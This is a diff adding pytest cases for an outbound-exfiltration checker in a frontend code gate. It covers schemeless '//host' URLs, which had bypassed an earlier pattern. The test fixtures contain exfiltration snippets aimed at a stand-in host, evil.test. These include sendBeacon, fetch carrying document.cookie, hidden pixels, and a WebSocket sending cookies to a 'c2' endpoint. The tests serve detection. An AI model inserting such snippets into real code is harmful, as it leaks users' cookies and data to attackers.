@@ -275,6 +275,84 @@ def test_filewrite_blocks_fire70_hidden_pixel():
         assert not target.exists()
 
 
+# --- QA-3 Fire 113: protocol-relative URL bypass ---------------------------
+
+
+def test_schemeless_sendbeacon_blocks():
+    """Fire 113: `//host/path` (browser fills in scheme at request time)
+    bypassed the original `https?://` literal. Now covered."""
+    content = 'navigator.sendBeacon("//evil.test/qa3ip113", data);'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_schemeless_raw_ip_sendbeacon_blocks():
+    """Raw-IP schemeless variant (Fire 113 exact repro host form)."""
+    content = 'navigator.sendBeacon("//1.2.3.4:8080/qa3ip113", data);'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "1.2.3.4" in err
+
+
+def test_schemeless_fetch_with_state_blocks():
+    """fetch("//host") + state keyword — schemeless exfil."""
+    content = (
+        "fetch('//evil.test/x', { body: document.cookie });\n"
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_schemeless_hidden_pixel_inline_blocks():
+    content = '<img src="//evil.test/pixel" style={{display:"none"}} />'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_schemeless_hidden_pixel_var_ref_blocks():
+    content = (
+        'const pixelUrl = "//evil.test/qa3-pixel?u=" + user;\n'
+        'return <img src={pixelUrl} style={{display:"none"}} />;\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_schemeless_websocket_with_state_blocks():
+    content = (
+        'const ws = new WebSocket("//evil.test/c2");\n'
+        'ws.onopen = () => ws.send(document.cookie);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_schemeless_localhost_passes():
+    """Schemeless `//localhost/x` still passes (legit dev endpoint)."""
+    assert check_outbound_exfil(
+        'navigator.sendBeacon("//localhost:3000/m", x);',
+        "App.tsx",
+    ) is None
+    assert check_outbound_exfil(
+        'fetch("//127.0.0.1:3000/api", { body: document.cookie });',
+        "App.tsx",
+    ) is None
+
+
+def test_double_slash_in_comments_no_false_positive():
+    """`//` in JS comments must not trigger the gate."""
+    content = (
+        "// this is a comment\n"
+        'const path = "a/b//c";\n'
+        "// http://example.com in a doc comment should also pass\n"
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
